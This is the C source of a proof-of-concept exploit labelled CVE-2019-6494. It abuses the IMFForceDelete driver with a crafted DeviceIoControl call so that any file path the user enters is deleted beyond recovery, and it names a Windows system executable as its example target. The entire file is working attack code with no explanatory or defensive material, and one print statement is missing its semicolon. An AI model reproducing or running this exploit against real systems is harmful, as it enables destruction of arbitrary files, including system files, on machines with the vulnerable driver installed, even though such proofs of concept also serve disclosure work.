#include <windows.h>
#include <stdio.h>

typedef unsigned long long QWORD; // DWORD64		

int main(int argc, char* argv[]) {
    printf("CVE-2019-6494 PoC\n");
    printf("---------------------------------------------------------------------------------\n"); 
    printf("Warning: Deleting files using this exploit aren't recoverable via the recycle bin\n");
    printf("---------------------------------------------------------------------------------\n");

    HANDLE hDriver = CreateFileW(L"\\\\.\\IMFForceDelete", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); // Get a handle to the driver
    if (hDriver != INVALID_HANDLE_VALUE) {
        printf("[i] Found driver\n");
        LPVOID lpInMemoryArea = VirtualAlloc((LPVOID)0x41000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (lpInMemoryArea == NULL) {
            printf("[!!!] Unable to allocate memory\n");
            ExitProcess(-1);
        }
        else {
            printf("[i] Allocated memory\n");
            memset(lpInMemoryArea, 0x00, 0x1000); // Clear memory area
            WCHAR wcPrefix[] = L"\\??\\Global\\";
            WCHAR szuPath[0x200] = { 0 };
            memmove(&szuPath, &wcPrefix, sizeof(wcPrefix));
            printf("Enter full path. Eg: C:\\Windows\\System32\\consent.exe\n");
            printf("> ");
            fgetws(&szuPath[sizeof(wcPrefix) / 2 - 1], 0x200 - sizeof(wcPrefix), stdin);
            memset(&szuPath[lstrlenW(&szuPath) - 0x1], 0x00, sizeof(WCHAR)); // Remove newline caused by using fgets
            wprintf(L"Deleting file: %ls\n", szuPath);
            memmove(lpInMemoryArea, &szuPath, sizeof(szuPath));
        }
        DWORD dwBytesOut = 0;
        DWORD dwIoctl = 0x8016E000;
        DeviceIoControl(hDriver, dwIoctl, lpInMemoryArea, 0x1000, NULL, 0x0, &dwBytesOut, NULL);
        printf("[i] File should be deleted, unless it was in use by another program.\n")
    }
    else {
        printf("[!!!] Unable to find driver\n");
        ExitProcess(-1);
    }
    ExitProcess(0);
}


